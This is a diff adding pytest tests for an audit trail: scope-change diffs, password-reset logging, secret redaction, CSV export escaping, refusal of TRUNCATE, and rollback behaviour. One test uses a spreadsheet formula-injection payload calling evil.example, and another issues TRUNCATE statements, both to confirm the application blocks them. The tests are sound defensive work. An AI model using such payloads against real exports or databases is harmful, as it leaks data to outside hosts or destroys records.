@@ -164,16 +164,109 @@ def test_memberships_scan_scope_and_config_are_recorded(env, tmp_path):
 
     # Scoped to acme: the suite's own fixtures approve a scope for ``default``
     # through the service layer, which records it as a ``system`` actor.
+    # A diff, not two whole scopes: what moved is the reviewable fact, and a
+    # tenant with thousands of entries would otherwise push the pair past the
+    # document cap and be stored as ``{"truncated": true}``.
     [scope] = events(client, admin, action="scan_scope.replace", tenant_id="acme")
-    assert scope["before"] == {"entries": []}
-    assert scope["after"]["entries"][0]["value"] == "10.0.0.0/8"
+    assert scope["before"] == {"removed": [], "entry_count": 0}
+    assert scope["after"]["entry_count"] == 1
+    assert scope["after"]["added"][0]["value"] == "10.0.0.0/8"
 
     # The config override is installation-wide, so it carries no tenant and is
-    # not in the tenant listing above.
+    # not in the tenant listing above. Recorded as the dot-paths that changed,
+    # with "[unset]" on the side where the path was not overridden at all.
     [config] = events(client, admin, action="config.update")
     assert config["tenant_id"] is None
     assert "nvd-secret-value" not in json.dumps(config)
-    assert config["after"]["enrichment"]["cvss4"]["nvd_api_key"] == audit_service.REDACTED
+    # Both sides redacted: the rule keys on the field name, so even the
+    # "[unset]" marker on the before side is replaced. That a secret path
+    # changed is the fact worth keeping; its old value is not.
+    assert config["before"] == {"enrichment.cvss4.nvd_api_key": audit_service.REDACTED}
+    assert config["after"] == {"enrichment.cvss4.nvd_api_key": audit_service.REDACTED}
+
+
+def test_a_scope_replace_records_the_diff_not_both_scopes(env):
+    """Two full scopes was the first shape of this, and it scaled badly.
+
+    A tenant with a few thousand entries pushed the pair past the audit table's
+    16 KiB document cap, where it became ``{"truncated": true}`` — a row saying
+    the scope changed and refusing to say how. The diff is bounded by the change
+    instead, and is also what a review actually reads.
+    """
+    client, _settings, admin = env
+    assert (
+        client.post("/api/tenants", headers=admin, json={"name": "Zeta", "tenant_id": "zeta"})
+        .status_code
+        == 201
+    )
+    keep = {"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}
+    drop = {"effect": "allow", "kind": "domain", "value": "old.example.com"}
+    add = {"effect": "deny", "kind": "domain", "value": "new.example.com"}
+    for entries in ([keep, drop], [keep, add]):
+        assert (
+            client.put(
+                "/api/tenants/zeta/scan-scope", headers=admin, json={"entries": entries}
+            ).status_code
+            == 200
+        )
+
+    second, _first = events(client, admin, action="scan_scope.replace", tenant_id="zeta")
+    assert [entry["value"] for entry in second["before"]["removed"]] == ["old.example.com"]
+    assert [entry["value"] for entry in second["after"]["added"]] == ["new.example.com"]
+    # The entry nobody touched is in neither side, even though the replace
+    # deleted and re-inserted its row with a new id and a new approved_at.
+    assert "10.0.0.0/8" not in json.dumps(second)
+    assert second["before"]["entry_count"] == second["after"]["entry_count"] == 2
+
+
+def test_password_resets_and_self_rotations_are_recorded_apart(env):
+    """The reset is a takeover in one request; the rotation is routine.
+
+    Recorded under different actions for that reason — folding an admin's reset
+    of somebody else's account in with every user's own rotation is how it stops
+    being the row anyone looks at. Neither carries the password, in either
+    direction.
+    """
+    client, _settings, admin = env
+    assert (
+        client.post(
+            "/api/users",
+            headers=admin,
+            json={"username": "rex", "password": "correct-horse-1", "role": "viewer"},
+        ).status_code
+        == 201
+    )
+    assert (
+        client.put(
+            "/api/users/rex/password", headers=admin, json={"password": "set-by-the-admin-9"}
+        ).status_code
+        == 200
+    )
+    rex = auth_headers(client, "rex", "set-by-the-admin-9")
+    assert (
+        client.post(
+            "/api/auth/password",
+            headers=rex,
+            json={
+                "current_password": "set-by-the-admin-9",
+                "new_password": "chosen-by-rex-77",
+            },
+        ).status_code
+        == 204
+    )
+
+    [reset] = events(client, admin, action=audit_service.ACTION_USER_PASSWORD_RESET)
+    assert reset["actor"] == "admin"
+    assert reset["resource_id"] == "rex"
+    # The timestamp that moved, not the value that was set.
+    assert reset["before"]["password_changed_at"] != reset["after"]["password_changed_at"]
+
+    [rotated] = events(client, admin, action=audit_service.ACTION_USER_PASSWORD_CHANGE)
+    assert rotated["actor"] == "rex"
+
+    trail = json.dumps(events(client, admin, limit=200))
+    assert "set-by-the-admin-9" not in trail
+    assert "chosen-by-rex-77" not in trail
 
 
 def test_credentials_never_reach_the_trail(env):
@@ -388,6 +481,50 @@ def test_the_export_streams_every_matching_row(env):
     assert all(row["action"] == "user.create" for row in rows)
 
 
+def test_the_csv_export_does_not_hand_a_spreadsheet_a_formula(env):
+    r"""Almost every column here is attacker-influenced.
+
+    An agent picks its own id, a viewer picks their ``User-Agent``, and a
+    ``resource_id`` is whatever was named in the request. The export exists to
+    be opened in a spreadsheet by someone reviewing an incident, which is the
+    worst possible place to feed the formula parser — so a cell starting with
+    one of ``= + - @ \t \r`` is prefixed with an apostrophe.
+    """
+    client, _settings, admin = env
+    hostile = {
+        **admin,
+        "User-Agent": '=HYPERLINK("https://evil.example/"&A1,"click")',
+    }
+    assert (
+        client.post(
+            "/api/users",
+            headers=hostile,
+            json={"username": "sue", "password": "correct-horse-1", "role": "viewer"},
+        ).status_code
+        == 201
+    )
+
+    export = client.get(
+        "/api/audit", headers=admin, params={"format": "csv", "resource_id": "sue"}
+    )
+    assert export.status_code == 200
+    [row] = [
+        line for line in export.text.splitlines()[1:] if line.strip()
+    ]
+    assert "'=HYPERLINK" in row
+    # And nowhere does a bare formula survive: every quoted cell in the row
+    # that carries the payload has the apostrophe in front of the '='.
+    assert ',=HYPERLINK' not in row
+    assert '"=HYPERLINK' not in row
+
+    # NDJSON is untouched — it is JSON, and nothing evaluates it.
+    ndjson = client.get(
+        "/api/audit", headers=admin, params={"format": "ndjson", "resource_id": "sue"}
+    )
+    [event] = [json.loads(line) for line in ndjson.text.splitlines() if line.strip()]
+    assert event["user_agent"].startswith("=HYPERLINK")
+
+
 def test_the_export_reader_pages_with_a_keyset_not_an_offset(env):
     """The batch boundary, which the HTTP tests above never cross."""
     client, _settings, admin = env
@@ -438,6 +575,71 @@ def test_the_trail_refuses_update_and_delete(env):
     # And the row is still there, unedited.
     [event] = events(client, admin, resource_id="ivy")
     assert event["actor"] == "admin"
+
+
+def test_the_trail_refuses_truncate(env):
+    """The statement the row triggers never see.
+
+    ``TRUNCATE`` does not fire a ``FOR EACH ROW`` trigger at all, so the
+    UPDATE/DELETE guards above are blind to it and one statement would empty the
+    whole trail — with the escape hatch's GUC not even needed.
+    """
+    client, settings, admin = env
+    assert (
+        client.post(
+            "/api/users",
+            headers=admin,
+            json={"username": "tom", "password": "correct-horse-1", "role": "viewer"},
+        ).status_code
+        == 201
+    )
+
+    for statement in (
+        "TRUNCATE audit_events",
+        # Not reachable through the retention function either: it deletes by
+        # age, and nothing in this project wants the table gone.
+        "SET LOCAL shapoclyack.audit_retention = 'on'; TRUNCATE audit_events",
+    ):
+        with pytest.raises(Exception) as refused:
+            with get_session(settings.postgres_url) as session:
+                for part in statement.split("; "):
+                    session.execute(text(part))
+        assert "append-only" in str(refused.value)
+
+    assert actions(client, admin, resource_id="tom") == ["user.create"]
+
+
+def test_a_rolled_back_change_leaves_no_row(env, monkeypatch):
+    """The other half of "the row commits with the change".
+
+    The suite already asserts that a change which succeeds is recorded. This is
+    the direction that would make the trail *lie* rather than merely lose: a
+    request that dies after :func:`audit.record` has added its row must take the
+    row down with the change, because both live in one session and one
+    transaction. Simulated by failing the instant the row is added — there is no
+    code between that point and the commit to fail on its own.
+    """
+    client, _settings, admin = env
+    original = audit_service.record
+
+    def record_then_die(session, context, **kwargs):
+        original(session, context, **kwargs)
+        raise RuntimeError("boom, with the audit row already in the session")
+
+    monkeypatch.setattr(audit_service, "record", record_then_die)
+    with pytest.raises(RuntimeError):
+        client.post(
+            "/api/users",
+            headers=admin,
+            json={"username": "una", "password": "correct-horse-1", "role": "viewer"},
+        )
+    monkeypatch.undo()
+
+    # Neither the account nor a row claiming it was created.
+    listed = client.get("/api/users", headers=admin)
+    assert listed.status_code == 200
+    assert "una" not in [user["username"] for user in listed.json()]
+    assert actions(client, admin, resource_id="una") == []
 
 
 def test_retention_prunes_through_the_privileged_function(env):
